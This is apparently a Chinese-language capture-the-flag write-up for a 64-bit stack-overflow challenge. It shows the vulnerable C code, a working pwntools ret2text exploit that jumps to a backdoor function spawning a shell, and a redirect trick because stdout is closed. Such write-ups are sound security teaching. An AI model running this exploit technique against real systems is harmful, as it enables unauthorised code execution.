# easy_overflow

## 题目简述

64 位程序在栈上分配了 16 字节缓冲区，却调用 `read(0, buf, 0x100)` 读取最多 256 字节，存在直接覆盖返回地址的栈溢出。二进制中还包含执行 `system("/bin/sh")` 的 `b4ckd0or`，因此可以构造 ret2text；需要额外处理程序主动关闭标准输出的问题。

## 解题过程

### 确认溢出与目标函数

`main` 的关键逻辑为：

```c
int main(void) {
    char buf[16];

    close(1);
    read(0, buf, 0x100);
    return 0;
}
```

程序还提供：

```c
int b4ckd0or(void) {
    return system("/bin/sh");
}
```

从 `buf` 起始位置到保存的返回地址共有 $0x10+0x8=0x18$ 字节，其中额外的 8 字节是保存的 `rbp`。覆盖返回地址为 `b4ckd0or` 即可进入后门。为满足 x86-64 SysV ABI 的栈对齐要求，先插入一个单独的 `ret` gadget。

### 构造利用

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)

# 本地调试时改为 process("./vuln")。
io = remote("目标地址", 端口)

rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]
backdoor = elf.symbols["b4ckd0or"]

payload = flat(
    b"A" * 0x18,
    ret,
    backdoor,
)

io.send(payload)
io.interactive()
```

进入 shell 后，直接执行 `cat flag` 会出现 `standard output: Bad file descriptor`，因为 `main` 已用 `close(1)` 关闭 stdout。将命令输出重定向到仍然打开的 stderr：

```bash
cat flag 1>&2
```

即可在连接中看到 flag。

## 方法总结

- 核心技巧：利用无 Canary 的栈溢出覆盖返回地址，跳转到现成后门函数。
- 易错点：偏移为 `0x18`，64 位调用 `system` 前通常需要一个 `ret` 对齐栈；成功获得 shell 也不代表 stdout 可用。
- 复用要点：交互 shell 无回显时应检查文件描述符状态，可把标准输出重定向到 stderr，或让目标命令直接向文件描述符 2 写入。
